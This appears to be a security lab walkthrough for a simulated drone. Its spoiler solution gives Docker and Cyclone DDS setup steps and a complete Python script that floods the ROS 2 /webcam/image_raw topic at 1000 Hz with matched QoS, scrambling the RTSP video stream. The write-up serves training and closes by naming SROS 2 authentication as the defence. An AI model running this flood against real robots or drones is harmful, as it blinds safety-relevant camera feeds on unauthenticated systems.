# Camera Feed ROS Topic Flooding

Flooding the ROS 2 topic to disrupt the drone's RTSP stream.

**Category:** Denial of Service

## Description

This attack involves flooding a ROS 2 topic with large amounts of data to overwhelm the system's resources, leading to disruption of services such as an RTSP stream. In this scenario, we target the `/webcam/image_raw` topic to disrupt the video stream.

On the master branch this scenario targeted ROS 1 Noetic (`rospy` + `ROS_MASTER_URI`). On the `ros2-migration` branch the lab runs ROS 2 Humble — there is no ROS master, discovery is peer-to-peer DDS, and you join the graph by matching `ROS_DOMAIN_ID` instead of pointing at a master URI.

## Resources

- [ROS 2 Humble Docker Image](https://hub.docker.com/r/osrf/ros)
- [ROS 2 Documentation](https://docs.ros.org/en/humble/)
- [Cyclone DDS configuration](https://github.com/eclipse-cyclonedds/cyclonedds)

## Solution Guide (Spoiler)

### Step 1. Set up the ROS 2 Docker container

Pull the ROS 2 Humble image and run an attacker container on the `simulator` network:

```sh
docker pull osrf/ros:humble-desktop
docker run -it --network=simulator --ip=10.13.0.10 \
    --name ros_humble_attacker osrf/ros:humble-desktop bash
```

### Step 2. Configure the ROS 2 environment

Inside the attacker container, set the same `ROS_DOMAIN_ID` the lab uses (42) and point Cyclone DDS at the lab's unicast peers (the simulator on `10.13.0.5` and the companion-computer on `10.13.0.3`). Multicast does not reliably traverse Docker bridges, so we use an explicit peers list — the same one the lab uses internally:

```sh
cat > /etc/cyclonedds.xml <<'EOF'
<?xml version="1.0" encoding="UTF-8"?>
<CycloneDDS xmlns="https://cdds.io/config">
  <Domain id="any">
    <General>
      <AllowMulticast>false</AllowMulticast>
    </General>
    <Discovery>
      <Peers>
        <Peer address="10.13.0.3"/>
        <Peer address="10.13.0.5"/>
      </Peers>
    </Discovery>
  </Domain>
</CycloneDDS>
EOF
export ROS_DOMAIN_ID=42
export RMW_IMPLEMENTATION=rmw_cyclonedds_cpp
export CYCLONEDDS_URI=file:///etc/cyclonedds.xml
source /opt/ros/humble/setup.bash
```

### Step 3. Confirm you can see the graph

```sh
ros2 topic list
ros2 topic info /webcam/image_raw
```

You should see `/webcam/image_raw` and at least one publisher (the simulator) and one subscriber (the companion-computer's RTSP republisher).

### Step 4. Create the flood script

```python
#!/usr/bin/env python3
import rclpy
from rclpy.node import Node
from rclpy.qos import qos_profile_sensor_data
from sensor_msgs.msg import Image
import numpy as np


class ImageFlooder(Node):
    def __init__(self):
        super().__init__('image_flooder')
        # QoS must match the legitimate publisher's profile (the
        # gazebo_ros_pkgs camera plugin uses SensorData by default:
        # KEEP_LAST + BEST_EFFORT). Mismatched QoS = your messages
        # get silently dropped at the subscriber.
        self.pub = self.create_publisher(
            Image, '/webcam/image_raw', qos_profile_sensor_data
        )
        # 1000 Hz timer; adjust as needed.
        self.timer = self.create_timer(1.0 / 1000.0, self.tick)

    def tick(self):
        img = Image()
        img.height = 480
        img.width = 640
        img.encoding = 'rgb8'
        img.is_bigendian = 0
        img.step = img.width * 3
        img.data = bytes(np.random.bytes(img.step * img.height))
        self.pub.publish(img)


def main():
    rclpy.init()
    node = ImageFlooder()
    try:
        rclpy.spin(node)
    except KeyboardInterrupt:
        pass
    finally:
        node.destroy_node()
        rclpy.shutdown()


if __name__ == '__main__':
    main()
```

### Step 5. Execute the flood script

```sh
python3 ros2-topic-flood.py
```

The attacker's messages interleave with the legitimate Gazebo frames at the subscriber. The RTSP stream (`rtsp://10.13.0.3:554/stream1`) becomes a chaotic mix of legitimate video and attacker noise.

### Step 6. Monitor the attack

From a separate shell on the attacker container:

```sh
ros2 topic hz /webcam/image_raw
```

Without the attack you should see ~10 Hz (the gazebo_ros camera update rate). With the attack running, you should see hundreds-to-thousands of Hz.

### Step 7. Stop the attack

`Ctrl+C` in the terminal running the flood script.

## Notes on ROS 2 vs ROS 1 attack mechanics

Two things to internalise:

1. There is no `ROS_MASTER_URI` to point at, and there is no `rosnode kill` that can stop an attacker from rejoining. The graph is decentralised; the only way to deny a publisher is to authenticate participants — that's what SROS 2 was built for.

2. ROS 2 has QoS profiles. The legitimate publisher (the `gazebo_ros` camera plugin) publishes with `SensorData` QoS (`KEEP_LAST`, `BEST_EFFORT`). If your attacker script uses the default `RELIABLE` QoS, the subscribers will not match it and your flooded messages will be silently discarded. Using `qos_profile_sensor_data` matches the legit profile.
